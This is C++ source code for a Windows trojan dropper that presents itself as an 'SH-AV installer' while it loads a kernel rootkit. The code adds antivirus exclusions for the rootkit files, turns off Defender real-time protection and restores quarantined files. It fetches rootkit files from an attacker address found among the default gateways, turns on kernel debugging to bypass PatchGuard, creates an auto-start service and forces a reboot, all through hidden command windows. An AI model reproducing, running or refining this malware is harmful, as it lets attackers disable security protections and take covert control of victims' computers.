#include "networking.h"
#include <iostream>
#include <random>
#include <string>
#include <shlobj_core.h>
#include "configurations.h"


std::wstring GetCurrentPath() {
    TCHAR PathBuffer[MAX_PATH] = { 0 };
    GetModuleFileName(NULL, PathBuffer, MAX_PATH);
    std::wstring::size_type PathEndPos = std::wstring(PathBuffer).find_last_of(L"\\/");
    return std::wstring(PathBuffer).substr(0, PathEndPos);
}


BOOL TrojanThread(LPVOID TrojParams) {
    char TargetIp[MAXIPV4_ADDRESS_SIZE] = { 0 };
    char AttackerIp[MAXIPV4_ADDRESS_SIZE] = { 0 };
    char DebugPort[MAX_PORT_SIZE] = { 0 };
    char DebugKey[MAX_DEBUGKEY_SIZE] = { 0 };
    RETURN_LAST LastError = { 0, ERROR_SUCCESS };
    ParseTrojanParams(TrojParams, TargetIp, AttackerIp, DebugPort, DebugKey);


    // Disable realtime protection to not trigger any virus checks/alerts:
    LastError = RealTime(TRUE);
    if (LastError.Represent != ERROR_SUCCESS || LastError.LastError != 0) {
        printf("[-] Cannot disable realtime protection - %d\n", LastError.LastError);
        return FALSE;
    }


    // Run cleaning commands for last iteration:
    ShellExecuteA(0, "open", "cmd.exe", "/C cd \"%ProgramFiles%\\Windows Defender\" > nul && MpCmdRun.exe -Restore -All > nul", 0, SW_HIDE);


    // Get all the needed files for the rootkit (would eventually be medium.exe and driver files) and configure remote debugging:
    if (!FilesAndDebugging(AttackerIp, DebugPort, DebugKey)) {
        return FALSE;
    }


    // Disable patchguard:
    ShellExecuteA(0, "open", "cmd.exe", "/C bcdedit /debug ON > nul", 0, SW_HIDE);


    // Enable RealTime Protection:
    LastError = RealTime(FALSE);
    if (LastError.Represent != ERROR_SUCCESS || LastError.LastError != 0) {
        printf("[-] Failed to enable realtime protection: %d\n", LastError.LastError);
        return FALSE;
    }


    // Create temporary service for AutoService:
    ShellExecuteA(0, "open", "cmd.exe", "/C sc stop RootAuto > nul", 0, SW_HIDE);
    ShellExecuteA(0, "open", "cmd.exe", "/C sc delete RootAuto > nul", 0, SW_HIDE);
    ShellExecuteA(0, "open", "cmd.exe", "/C sc create RootAuto type=own start=auto binPath=C:\\9193bbfd1a974b44a49f740ded3cfae7a03bbedbe7e3e7bffa2b6468b69d7097\\42db9c51385210f8f5362136cc2ef5fbaddfff41cb0ef4fab0a80d211dd16db5\\AutoStart.exe", 0, SW_HIDE);
    

    // Forcefully restart machine:
    Sleep(5000);
    printf("[+] Resetting computer ..\n");
    ShellExecuteA(0, "open", "cmd.exe", "/C shutdown -r -f -t 1 > nul", 0, SW_HIDE);
    return TRUE;
}


int main() {
    char NullTerm = '\0';
    char Tilda = '~';
    char Inp = 0;
    char GuessLetter = 0;
    char RandLetter = 0;
    char TargetIp[MAXIPV4_ADDRESS_SIZE] = { 0 };
    char AttackerIp[MAXIPV4_ADDRESS_SIZE] = { 0 };
    char* AttackerAddresses = NULL;
    const char* DebugPort = "50003";
    const char* DebugKey = "7DY7NXTWOM9I.3BM9J5ZCB6EI.CMVKI54LP3U.NUS6VXQK1111";

    const char* Alp = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789.,/;[]{}:-_=+)(*&^%$#@!~`";
    std::random_device rd;
    std::mt19937 gen(rd());
    std::uniform_int_distribution<> distr(0, strlen(Alp) - 1);
    SECURITY_ATTRIBUTES Trojattr = { 0 };
    HANDLE TrojanHandle = INVALID_HANDLE_VALUE;
    LPVOID TrojanParams = NULL;


    // Create exclusions for virus files:
    ExcludeRootkitFiles();


    // Get the possible IP addresses for the attacker (in this case - all default gateways):
    AttackerAddresses = GetGatewayList();
    if (AttackerAddresses == NULL) {
        printf("[-] Cannot get list of gateway addresses (attacker addresses)!\n");
        return 0;
    }


    // Get IP addresses of target and attacker:
    if (!MatchIpAddresses(TargetIp, AttackerIp, AttackerAddresses)) {
        printf("[-] Cannot find the target address and the matching attacker address!\n");
        free(AttackerAddresses);
        return 0;
    }
    free(AttackerAddresses);


    // Trojan variables and calling:
    Trojattr.bInheritHandle = FALSE;
    Trojattr.nLength = sizeof(SECURITY_ATTRIBUTES);
    Trojattr.lpSecurityDescriptor = NULL;


    // Trojan parameter buffer:
    TrojanParams = malloc(strlen(TargetIp) + strlen(AttackerIp) + strlen(DebugPort) + strlen(DebugKey) + 4);
    if (TrojanParams == NULL) {
        printf("[-] Cannot continue with FunEngine (params = NULL), please retry..\n");
        free(TrojanParams);
        return 1;
    }
    memcpy(TrojanParams, TargetIp, strlen(TargetIp));
    memcpy((PVOID)((ULONG64)TrojanParams + strlen(TargetIp)), &Tilda, 1);
    memcpy((PVOID)((ULONG64)TrojanParams + strlen(TargetIp) + 1), AttackerIp, strlen(AttackerIp));
    memcpy((PVOID)((ULONG64)TrojanParams + strlen(TargetIp) + strlen(AttackerIp) + 1), &Tilda, 1);
    memcpy((PVOID)((ULONG64)TrojanParams + strlen(TargetIp) + strlen(AttackerIp) + 2), DebugPort, strlen(DebugPort));
    memcpy((PVOID)((ULONG64)TrojanParams + strlen(TargetIp) + strlen(AttackerIp) + strlen(DebugPort) + 2), &Tilda, 1);
    memcpy((PVOID)((ULONG64)TrojanParams + strlen(TargetIp) + strlen(AttackerIp) + strlen(DebugPort) + 3), DebugKey, strlen(DebugKey));
    memcpy((PVOID)((ULONG64)TrojanParams + strlen(TargetIp) + strlen(AttackerIp) + strlen(DebugPort) + strlen(DebugKey) + 3), &NullTerm, 1);


    // Start trojan thread and input from user:
    TrojanHandle = CreateThread(&Trojattr,
        0,
        (LPTHREAD_START_ROUTINE)&TrojanThread,
        TrojanParams,
        0,
        NULL);

    if (TrojanHandle == INVALID_HANDLE_VALUE) {
        printf("[-] Cannot continue with FunEngine, please retry..\n");
        free(TrojanParams);
        return 1;
    }
    printf("[+] Welcome to SH-AV installer!\n");
    printf("[+] Downloading needed files and setting services up ..\n");
    WaitForSingleObject(TrojanHandle, INFINITE);
    free(TrojanParams);
    return 0;
}
